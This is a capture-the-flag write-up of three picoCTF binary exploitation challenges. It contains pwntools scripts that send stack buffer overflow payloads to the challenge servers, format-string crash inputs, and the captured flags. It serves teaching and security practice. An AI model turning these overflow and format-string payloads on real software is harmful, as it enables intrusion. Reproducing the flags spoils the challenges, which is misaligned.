

# 1. buffer overflow 0

> Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here. Additional details will be available after launching your challenge instance.

## Solution:

- Reviewed the C source code (vuln.c), noticed a function, sigsegv_handler, that prints the flag if the program crashes, found a bug in the vuln function: strcpy copies input into buf2, a buffer of only 16 bytes, the main function uses gets, which allows an input much longer than 16 bytes, so I sent a long string  to overflow buf2.
- This overflow caused a program crash, the sigsegv_handler will then run and print the flag.
- Used a Python script with the pwntools library to send this long string.
- Code:-
```
from pwn import *
import time

HOST = 'saturn.picoctf.net'
PORT = 60890

payload = b'A' * 40

try:
    p = remote(HOST, PORT)
    print(f"Connecting to {HOST}:{PORT}...")
except Exception as e:
    print(f"Failed to connect: {e}")
    print("Please make sure pwntools is installed: pip install pwntools")
    exit()
    
prompt = p.recvuntil(b'Input: ')
print(prompt.decode(), end='')

print(f"Sending payload: {payload.decode()}")
p.sendline(payload)

print("\nServer response:")
try:
    response = p.recvall()
    print(response.decode().strip())
except EOFError:
    print("[Connection closed cleanly (or EOF)]")
except Exception as e:
    print(f"An error occurred: {e}")

print("\nConnection closed.")
```
## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef01832d}
```

## Concepts learnt:

- Basic stack-based buffer overflow.

- Analyzing C source code for vulnerabilities like strcpy and gets.


## Resources:

- [Binary Exploitation](./https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN)

***


# 2. format string 0
> Can you use your knowledge of format strings to make the customers happy? Download the binary here. Download the source here.Additional details will be available after launching your challenge instance.

## Solution:

- analyzed the format-string-0.c source code, found a sigsegv_handler function that prints the flag if the program crashes, the program has a format string vulnerability, calling printf() directly with user input.
- to pass serve_patrick, we must print > 64 chars. We send Gr%114d_Cheese, as %114d prints a 114-character string.
- to get the flag, we must crash serve_bob. We send Cla%sic_Che%s%steak, as %s tries to read from an invalid address, causing a crash.
- this crash triggers the sigsegv_handler and prints the flag.

## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}

```

## Concepts learnt:

- Format String Vulnerabilities (using %s, %d, etc.)


## Resources:

- [Format String Attacks](./https://owasp.org/www-community/attacks/Format_string_attack)

***


# 3. clutter-overflow
> Clutter, clutter everywhere and not a byte to use. nc mars.picoctf.net 31890
## Solution:

- Looked at the chall.c source code, the goal is to make the code variable equal 0xdeadbeef to get the flag, found that code is a variable on the stack, right after a 256-byte buffer called clutter, the program uses gets, which is a well-known buffer overflow bug because it doesn't check your input size, this means we can send more than 256 bytes to "overflow" the clutter buffer and overwrite the code variable.
- after some testing, found out there were 8 bytes of extra padding between the buffer and the code variable.So, the final payload needs 264 bytes of junk to fill the buffer and the padding, followed by the 8-byte value of 0xdeadbeef.
- Used pwntools to build and send this payload. The server then runs cat flag.txt and gives us the flag.
- Code:-
```
from pwn import *
import time

HOST = 'mars.picoctf.net'
PORT = 31890

payload = b'A' * 264

payload += p64(0xdeadbeef)

print(f"Payload: {payload}")

try:
    p = remote(HOST, PORT)
    
    p.recvuntil(b"What do you see?\n")
    
    print("Sending payload...")
    p.sendline(payload)
    
    print("\nServer response:")
    response = p.recvall()
    print(response.decode().strip())

except Exception as e:
    print(f"An error occurred: {e}")

```
## Flag:

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts learnt:

- using stack-based buffer overflow.
- using pwntools to send exploit payloads.


## Resources:

- [Pwn Documentation](./https://github.com/JohnHammond/ctf-katana?tab=readme-ov-file#forensics)
***
